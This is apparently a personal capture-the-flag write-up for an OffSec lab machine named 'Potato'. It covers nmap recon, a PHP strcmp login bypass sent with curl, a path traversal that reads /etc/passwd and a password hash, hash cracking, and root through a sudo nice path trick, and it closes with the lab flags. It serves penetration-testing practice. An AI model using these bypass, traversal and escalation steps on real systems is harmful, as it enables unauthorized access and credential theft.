# [About]
```
=========================================================================
[OS]: ubuntu [linux]
[Web-Technology]: PHP
[Hostname]: serv
[IP]: 192.168.227.101
[USERS]:  admin, webadmin, florianges
[CREDENTIALS]: `admin:potato`, `webadmin:dragon`
=========================================================================

```

# [Recon]

```
[To-Try LIST]:
80 --> file/directory fuzzing [wfuzz], nikto, view page source
2112 --> anonymous login
22 --> 

=========================================================================
[NMAP RESULTS]:
Nmap scan report for 192.168.227.101
PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ef:24:0e:ab:d2:b3:16:b4:4b:2e:27:c0:5f:48:79:8b (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDamdAqH2ZyWoYj0tstPK0vbVKI+9OCgtkGDoynffxqV2kE4ceZn77FBuMGFKLU50Uv5RMUTFTX4hm1ijh77KMGG1CmAk2YWvEDhxbCBPCohp+xXMBXHBYoMbEVl/loKL2UW6USnKorOgwxUdoMAwDxIrohGHQ5WNUADRaqt1eHuHxuJ8Bgi8yzqP/26ePQTLCfwAZMq+SYPJedZBmfJJ3Brhb/CGgzgRU8BpJGI8IfBL5791JTn2niEgoMAZ1vdfnSx0m49uk8npd0h5hPQ+ucyMh+Q35lJ1zDq94E24mkgawDhEgmLtb23JDNdY4rv/7mAAHYA5AsRSDDFgmbXEVcC7N1c3cyrwVH/w+zF5SKOqQ8hOF7LRCqv0YQZ05wyiBu2OzbeAvhhiKJteICMuitQAuF6zU/dwjX7oEAxbZ2GsQ66kU3/JnL4clTDATbT01REKJzH9nHpO5sZdebfLJdVfx38qDrlS+risx1QngpnRvWTmJ7XBXt8UrfXGenR3U=
|   256 f2:d8:35:3f:49:59:85:85:07:e6:a2:0e:65:7a:8c:4b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNoh1z4mRbfROqXjtv9CG7ZYGiwN29OQQCVXMLce4ejLzy+0Bvo7tYSb5PKVqgO5jd1JaB3LLGWreXo6ZY3Z8T8=
|   256 0b:23:89:c3:c0:26:d5:64:5e:93:b7:ba:f5:14:7f:3e (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDXv++bn0YEgaoSEmMm3RzCzm6pyUJJSsSW9FMBqvZQ3
80/tcp   open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Potato company
|_http-server-header: Apache/2.4.41 (Ubuntu)
2112/tcp open  ftp     syn-ack ProFTPD
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--   1 ftp      ftp           901 Aug  2  2020 index.php.bak
|_-rw-r--r--   1 ftp      ftp            54 Aug  2  2020 welcome.msg
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


=========================================================================
[Web Services Enumeration]:

# https://www.doyler.net/security-not-included/bypassing-php-strcmp-abctf2016

curl -X POST "http://potato.offsec/admin/index.php?login=1" -d "'username':'admin', 'password':'potato'"
curl -X POST "http://potato.offsec/admin/index.php?login=1" -d "username=admin&password[] ==0"
search for strcmp rules where password username=admin&password[]==0


burp --> http://potato.offsec/admin/dashboard.php?page=log
Contenu du fichier ../../../../../etc/passwd 
florianges:x:1000:1000:florianges:/home/florianges:/bin/bash
webadmin:$1$webadmin$3sXBxGUtDGIFAcnNTNhi6/:1001:1001:webadmin,,,:/home/webadmin:/bin/bash



Directories 80
=====================================================================
ID           Response   Lines    Word       Chars       Payload                       
=====================================================================

000000003:   200        19 L     27 W       466 Ch      "admin"                       
000000386:   403        9 L      28 W       280 Ch      "icons"                       
000004227:   403        9 L      28 W       280 Ch      "server-status"               
000004255:   200        8 L      32 W       245 Ch      "http://192.168.227.101//"  

=========================================================================
[OTHER / PRIVILEGE-ESCALATION]:
* sudo -l
User webadmin may run the following commands on serv:
    (ALL : ALL) /bin/nice /notes/*

* created a script on webadmin home dir
echo "/bin/sh" > shell.sh;chmod +x shell.sh
sudo /bin/nice /notes/../home/webadmin/shell.sh

`userflag:20729b52092792efbe2cb92eb772b30a`
`rootflag:9a298a75bb228157b726954e40e37b84`



=========================================================================
Take Away Concepts (for the flat-file reference system):
* Super simple root but require critical thinking. on $IP/admin/index.php?login=1, capture request and apply the strcmp bypass above [username=admin&password[]==0] which will log on in to dashboard
* on dashboard, i tried every tab but the log tab makes more sense which i captured using burp and chang de file input to ../../../../../etc/passwd
* i saw the webadmin user hash a hash which i copy and save locally and crack with john. which i then ssh into.
* Awesome room

```